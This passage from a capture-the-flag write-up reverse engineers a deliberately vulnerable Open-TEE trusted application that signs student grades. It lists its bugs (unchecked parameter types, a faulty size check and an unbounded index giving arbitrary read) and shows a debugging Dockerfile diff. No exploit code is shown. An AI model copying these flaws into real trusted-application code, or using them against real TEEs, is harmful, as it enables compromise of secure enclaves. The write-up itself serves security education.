+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> SHA1_SIZE; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%02x&#34;</span>, sha1[i]);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* ... Cleanup used connection/resources ... */</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>exit</span>(tee_rv);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=34-security-considerations>3.4 Security considerations</h3><p>So, with all that said, what can go wrong with TAs?</p><ul><li>Global variables. Global variables have the same lifetime as the lifetime of a TA instance and can be accessed between multiple sessions and commands. This can lead to state confusion bugs.</li><li>To determine whether a given buffer is a Memory Reference or a buffer owned by the TA itself, the function <code>TEE_CheckMemoryAccessRights</code> can be used.</li><li>The <code>uint32_t paramTypes</code> should always be checked against what the TA expects before accessing the parameters themselves (<code>TEE_Param params[4])</code>. Otherwise, vulnerabilities can occur such as type confusion leading to RCE within the TA.</li><li>TOCTOU vulnerabilities can occur as Memory Reference parameters refer to Shared Memory between the client (REE) and the TA (TEE).</li></ul><h2 id=4-reversing-revisited>4. Reversing revisited!</h2><p>So, with our understanding of TAs now, let&rsquo;s reverse <code>grade_ta.so</code>. Let&rsquo;s first look at the properties of the TA:</p><p><img src=/post-resources/TrustMEE/ta-properties.png alt=ta-properties.png></p><p>It is good to know its UUID, that it is a Single Instance and that it allows multiple sessions. Next, we reverse engineer the Entry Point functions, i.e.:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>TA_CreateEntryPoint
+</span></span><span style=display:flex><span>TA_DestroyEntryPoint
+</span></span><span style=display:flex><span>TA_OpenSessionEntryPoint
+</span></span><span style=display:flex><span>TA_CloseSessionEntryPoint
+</span></span><span style=display:flex><span>TA_InvokeCommandEntryPoint
+</span></span></code></pre></div><p>Since we have the source code of Open-TEE, we can create a <a href=https://github.com/nikosChalk/ctf-writeups/blob/master/lakeCTF23/pwn/trustMEE/solution/opentee-helper.h target=_blank rel="noopener noreferrer">helper header</a> for Ghidra to parse and have all the data type declarations available. After some reversing, here is the final decompilation of <code>grade_ta.so</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>TA_CreateEntryPoint</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>TA_DestroyEntryPoint</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span>[<span style=color:#ae81ff>256</span>] GRADE_KEY;
+</span></span><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>TA_OpenSessionEntryPoint</span>(<span style=color:#66d9ef>uint32_t</span> paramTypes,TEE_Param <span style=color:#f92672>*</span>params,<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>sessionContext) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>256</span>; i<span style=color:#f92672>++</span>)
+</span></span><span style=display:flex><span>    GRADE_KEY[i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>getRandomByte</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>TEE_AllocateOperation</span>(sessionContext,TEE_ALG_MD5,TEE_MODE_DIGEST,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>TA_CloseSessionEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>TA_InvokeCommandEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext,<span style=color:#66d9ef>uint32_t</span> commandID,<span style=color:#66d9ef>uint32_t</span> paramTypes,TEE_Param <span style=color:#f92672>*</span>params) {
+</span></span><span style=display:flex><span>  TEE_Result TVar1;
+</span></span><span style=display:flex><span>  signedStudent <span style=color:#f92672>*</span>curSignedStudent;
+</span></span><span style=display:flex><span>  student <span style=color:#f92672>*</span>curStudent;
+</span></span><span style=display:flex><span>  undefined8 lineno;
+</span></span><span style=display:flex><span>  student <span style=color:#f92672>*</span>studentArray;
+</span></span><span style=display:flex><span>  student <span style=color:#f92672>*</span>student2;
+</span></span><span style=display:flex><span>  signedStudent <span style=color:#f92672>*</span>end;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> idx;
+</span></span><span style=display:flex><span>  student <span style=color:#f92672>*</span>student1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> sz;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Assignments to `lineno` variable have been omitted */</span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* SIGN_CLASS */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (commandID <span style=color:#f92672>==</span> SIGN_CLASS) {
+</span></span><span style=display:flex><span>    curStudent <span style=color:#f92672>=</span> (student <span style=color:#f92672>*</span>)(params<span style=color:#f92672>-&gt;</span>memref).buffer;
+</span></span><span style=display:flex><span>    curSignedStudent <span style=color:#f92672>=</span> (signedStudent <span style=color:#f92672>*</span>)params[<span style=color:#ae81ff>1</span>].memref.buffer;
+</span></span><span style=display:flex><span>    sz <span style=color:#f92672>=</span> params[<span style=color:#ae81ff>1</span>].memref.size;
+</span></span><span style=display:flex><span>    TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(TEE_MEMORY_ACCESS_READ <span style=color:#f92672>|</span> TEE_MEMORY_ACCESS_ANY_OWNER, curStudent,(params<span style=color:#f92672>-&gt;</span>memref).size);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>      TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(TEE_MEMORY_ACCESS_READ <span style=color:#f92672>|</span> TEE_MEMORY_ACCESS_ANY_OWNER,curSignedStudent,sz);
+</span></span><span style=display:flex><span>      end <span style=color:#f92672>=</span> curSignedStudent <span style=color:#f92672>+</span> NR_STUDENTS;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>( true ) {
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent,curStudent,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent<span style=color:#f92672>-&gt;</span>lastname,curStudent<span style=color:#f92672>-&gt;</span>lastname,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>          curSignedStudent<span style=color:#f92672>-&gt;</span>grade <span style=color:#f92672>=</span> curStudent<span style=color:#f92672>-&gt;</span>grade;
+</span></span><span style=display:flex><span>          curSignedStudent<span style=color:#f92672>-&gt;</span>sciper <span style=color:#f92672>=</span> curStudent<span style=color:#f92672>-&gt;</span>sciper;
+</span></span><span style=display:flex><span>          TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calculate_signature</span>(sessionContext,curSignedStudent);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>!=</span> TEE_SUCCESS) <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>          curSignedStudent <span style=color:#f92672>=</span> curSignedStudent <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>          curStudent <span style=color:#f92672>=</span> curStudent <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> (curSignedStudent <span style=color:#f92672>==</span> end) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> TEE_SUCCESS;
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> LAB_001014fa;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (commandID <span style=color:#f92672>!=</span> SIGN_STUDENT) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (commandID <span style=color:#f92672>!=</span> SIGN_CLASS_STUDENT) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      
+</span></span><span style=display:flex><span>      <span style=color:#75715e>/* SIGN_CLASS_STUDENT */</span>
+</span></span><span style=display:flex><span>      studentArray <span style=color:#f92672>=</span> (student <span style=color:#f92672>*</span>)(params<span style=color:#f92672>-&gt;</span>memref).buffer;
+</span></span><span style=display:flex><span>      curSignedStudent <span style=color:#f92672>=</span> (signedStudent <span style=color:#f92672>*</span>)params[<span style=color:#ae81ff>1</span>].memref.buffer;
+</span></span><span style=display:flex><span>      sz <span style=color:#f92672>=</span> params[<span style=color:#ae81ff>1</span>].memref.size;
+</span></span><span style=display:flex><span>      idx <span style=color:#f92672>=</span> params[<span style=color:#ae81ff>2</span>].value.a;
+</span></span><span style=display:flex><span>      TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(TEE_MEMORY_ACCESS_READ <span style=color:#f92672>|</span> TEE_MEMORY_ACCESS_ANY_OWNER, studentArray,(params<span style=color:#f92672>-&gt;</span>memref).size);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>        TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(TEE_MEMORY_ACCESS_READ <span style=color:#f92672>|</span> TEE_MEMORY_ACCESS_ANY_OWNER, curSignedStudent,sz);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>          student1 <span style=color:#f92672>=</span> studentArray <span style=color:#f92672>+</span> (<span style=color:#66d9ef>int</span>)idx;
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent,student1,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent<span style=color:#f92672>-&gt;</span>lastname,studentArray[(<span style=color:#66d9ef>int</span>)idx].lastname,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>          curSignedStudent<span style=color:#f92672>-&gt;</span>grade <span style=color:#f92672>=</span> student1<span style=color:#f92672>-&gt;</span>grade;
+</span></span><span style=display:flex><span>          curSignedStudent<span style=color:#f92672>-&gt;</span>sciper <span style=color:#f92672>=</span> student1<span style=color:#f92672>-&gt;</span>sciper;
+</span></span><span style=display:flex><span>          TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calculate_signature</span>(sessionContext,curSignedStudent);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> TEE_SUCCESS;
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>goto</span> LAB_001014fa;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>__syslog_chk</span>(<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;%s:%s:%d  Bad Parameters!&#34;</span>,<span style=color:#e6db74>&#34;../../TAs/vuln_ta/vuln_ta.c&#34;</span>, <span style=color:#e6db74>&#34;TA_InvokeCommandEntryPoint&#34;</span>,lineno);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* SIGN_STUDENT */</span>
+</span></span><span style=display:flex><span>    student2 <span style=color:#f92672>=</span> (student <span style=color:#f92672>*</span>)(params<span style=color:#f92672>-&gt;</span>memref).buffer;
+</span></span><span style=display:flex><span>    curSignedStudent <span style=color:#f92672>=</span> (signedStudent <span style=color:#f92672>*</span>)params[<span style=color:#ae81ff>1</span>].memref.buffer;
+</span></span><span style=display:flex><span>    sz <span style=color:#f92672>=</span> params[<span style=color:#ae81ff>1</span>].memref.size;
+</span></span><span style=display:flex><span>    TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(TEE_MEMORY_ACCESS_READ <span style=color:#f92672>|</span> TEE_MEMORY_ACCESS_ANY_OWNER, student2,(params<span style=color:#f92672>-&gt;</span>memref).size);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>      TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(TEE_MEMORY_ACCESS_READ <span style=color:#f92672>|</span> TEE_MEMORY_ACCESS_ANY_OWNER, curSignedStudent,sz);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent,student2,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent<span style=color:#f92672>-&gt;</span>lastname,student2<span style=color:#f92672>-&gt;</span>lastname,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>        curSignedStudent<span style=color:#f92672>-&gt;</span>grade <span style=color:#f92672>=</span> student2<span style=color:#f92672>-&gt;</span>grade;
+</span></span><span style=display:flex><span>        curSignedStudent<span style=color:#f92672>-&gt;</span>sciper <span style=color:#f92672>=</span> student2<span style=color:#f92672>-&gt;</span>sciper;
+</span></span><span style=display:flex><span>        TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calculate_signature</span>(sessionContext,curSignedStudent);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>return</span> TEE_SUCCESS;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>LAB_001014fa:
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>__syslog_chk</span>(<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;%s:%s:%d  Signature Calculation Failed!&#34;</span>,<span style=color:#e6db74>&#34;../../TAs/vuln_ta/vuln_ta.c&#34;</span>, <span style=color:#e6db74>&#34;TA_InvokeCommandEntryPoint&#34;</span>,lineno);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> TVar1;
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__syslog_chk</span>(<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;%s:%s:%d  Bad Parameters!&#34;</span>,<span style=color:#e6db74>&#34;../../TAs/vuln_ta/vuln_ta.c&#34;</span>, <span style=color:#e6db74>&#34;TA_InvokeCommandEntryPoint&#34;</span>,lineno);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TEE_Result <span style=color:#a6e22e>calculate_signature</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext,signedStudent <span style=color:#f92672>*</span>signedStudent) {
+</span></span><span style=display:flex><span>  TEE_Result TVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> in_FS_OFFSET;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> local_50;
+</span></span><span style=display:flex><span>  undefined hash [<span style=color:#ae81ff>24</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> local_30;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  TVar1 <span style=color:#f92672>=</span> TEE_ERROR_SECURITY;
+</span></span><span style=display:flex><span>  local_30 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (signedStudent<span style=color:#f92672>-&gt;</span>grade <span style=color:#f92672>-</span> <span style=color:#ae81ff>1U</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>6</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_DigestUpdate</span>(sessionContext,signedStudent,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_DigestUpdate</span>(sessionContext,signedStudent<span style=color:#f92672>-&gt;</span>lastname,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_DigestUpdate</span>(sessionContext,<span style=color:#f92672>&amp;</span>signedStudent<span style=color:#f92672>-&gt;</span>grade,<span style=color:#ae81ff>4</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_DigestUpdate</span>(sessionContext,GRADE_KEY,<span style=color:#ae81ff>0x100</span>);
+</span></span><span style=display:flex><span>    local_50 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;address of sig %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_DigestDoFinal</span>(sessionContext,(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>0</span>,hash,<span style=color:#f92672>&amp;</span>local_50);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;hash: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,hash);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_MemMove</span>(signedStudent<span style=color:#f92672>-&gt;</span>signature,hash,(<span style=color:#66d9ef>uint32_t</span>)local_50);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;hash length: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,local_50);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_30 <span style=color:#f92672>==</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(in_FS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//stack canary check
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> TVar1;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__stack_chk_fail</span>();
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The main takeaways are:</p><ul><li><code>TA_OpenSessionEntryPoint</code> initializes some array with random data and prepares the TA for MD5 hashing</li><li><code>TA_InvokeCommandEntryPoint</code> accepts 3 commands:<ul><li><code>SIGN_CLASS</code>. This command signs a whole class of students, i.e. <code>NR_STUDENTS</code> students.<ul><li><code>params[0]</code> is a Memory Reference to <code>struct student</code></li><li><code>params[1]</code> is a Memory Reference to <code>struct signedStudent</code></li></ul></li><li><code>SIGN_CLASS_STUDENT</code>. This command signs the given student at the given index.<ul><li><code>params[0]</code> is a Memory Reference to <code>struct student</code></li><li><code>params[1]</code> is a Memory Reference to <code>struct signedStudent</code></li><li><code>params[2]</code> is a Value Parameter and is used as an index in the <code>params[0]</code> buffer.</li></ul></li><li><code>SIGN_STUDENT</code>. This command signs the given student using memory references.<ul><li><code>params[0]</code> is a Memory Reference to <code>struct student</code></li><li><code>params[1]</code> is a Memory Reference to <code>struct signedStudent</code></li></ul></li></ul></li></ul><h3 id=41-identifying-the-bugs>4.1 Identifying the bugs</h3><p>Now, we have fully reversed the TA and know its functionality. Next step is to spot the bugs. The first major bug is that no command checks the type of arguments and their data flow direction. This is <strong>really really really bad</strong> as type confusion is possible in all commands. The following bugs are also present:</p><ul><li>In <code>SIGN_CLASS</code>, the size is not checked correctly. The line <code>end = curSignedStudent + NR_STUDENTS</code> means that the given memory reference is always assumed to contain <code>NR_STUDENTS*sizeof(struct student)</code> bytes.</li><li>In <code>SIGN_CLASS_STUDENT</code>, there is no bounds checking on the index. This leads to an arbitrary read.</li></ul><h2 id=5-detour-environment-setup>5. Detour! Environment setup</h2><p>Great! At this point we have analyzed the TA and know where the bugs are. Next step is to start poking the TA by writing a client application, running it, and debugging things! In this challenge a <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/resources/Dockerfile target=_blank rel="noopener noreferrer">Dockerfile</a> was provided. This Dockerfile is based on the <a href=https://github.com/Open-TEE/Open-TEE#setup target=_blank rel="noopener noreferrer">install instructions of Open-TEE</a>. We <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/lakeCTF23/pwn/trustMEE/solution/Dockerfile target=_blank rel="noopener noreferrer">augment the Dockerfile</a> a bit as shown below to facilitate easier debugging:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span>fane@ctf-box:~/ctfs/lakeCTF23/trustMEE-replay$ git diff --no-index challenge-desc/Dockerfile Dockerfile
+</span></span><span style=display:flex><span>diff --git a/challenge-desc/Dockerfile b/Dockerfile
+</span></span><span style=display:flex><span>index eedd449..fdeb85d 100644
+</span></span><span style=display:flex><span><span style=color:#f92672>--- a/challenge-desc/Dockerfile
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/Dockerfile
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -1,7 +1,21 @@
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>-# docker build -t trustmee . &amp;&amp; docker run --rm -it ctf trustmee &amp;&amp; docker exec -it -u ctf [docker_id] /bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+# docker build -t trustmee .
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+# docker run -v ./solution:/home/ctf/solution --cap-add=SYS_PTRACE --rm -it --name trustmee_1 trustmee
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#  * --cap-add=SYS_PTRACE is used so that we can run gdb inside
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#  * mounting a volume for easier exploit development
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+# To pwn the challenge:
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#   docker exec -it -u ctf trustmee_1 /bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+# To debug the challenge
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#   docker exec -it -u root trustmee_1 /bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> FROM ubuntu:22.04@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+# Fix locales
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+ENV LANG en_US.utf8
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+RUN apt-get update &amp;&amp; apt-get install -y locales
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+RUN localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> # Dependencies
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+RUN apt-get install -y gdb
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> RUN apt-get update &amp;&amp; \
+</span></span><span style=display:flex><span>     apt-get install -y wget xinetd cmake build-essential unzip git dropbear rsync openssh-client libcap2-bin python3 python3-pip &amp;&amp; apt-get clean
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -9,6 +23,12 @@ RUN useradd -d /home/ctf/ -m -s /bin/bash ctf &amp;&amp; passwd -d ctf
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span> WORKDIR /home/ctf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+# Setup pwndbg
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+RUN git clone https://github.com/pwndbg/pwndbg
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+WORKDIR /home/ctf/pwndbg
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+RUN ./setup.sh
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+WORKDIR /home/ctf/
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> # Clone and install OpenTEE
+</span></span><span style=display:flex><span> RUN apt-get install -y build-essential git pkg-config uuid-dev libelf-dev wget curl autoconf automake libtool libfuse-dev
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>@@ -45,6 +65,9 @@ RUN chmod +x /opt/OpenTee/lib/TAs/grade_ta.so
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span> COPY opentee.conf /etc/
+</span></span><span style=display:flex><span> RUN ln -s /usr/local/lib/libmbedcrypto.so.3.1.0 /opt/OpenTee/lib/libmbedcrypto.so.11
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>+ENV OPEN_TEE_PATH /opt/OpenTee
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+ENV LD_LIBRARY_PATH=&#34;${LD_LIBRARY_PATH}:$OPEN_TEE_PATH/lib&#34;
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
+</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> # Copy flag
+</span></span><span style=display:flex><span> COPY flag.txt /opt/OpenTee/
+</span></span><span style=display:flex><span> RUN chmod 000 /opt/OpenTee/flag.txt
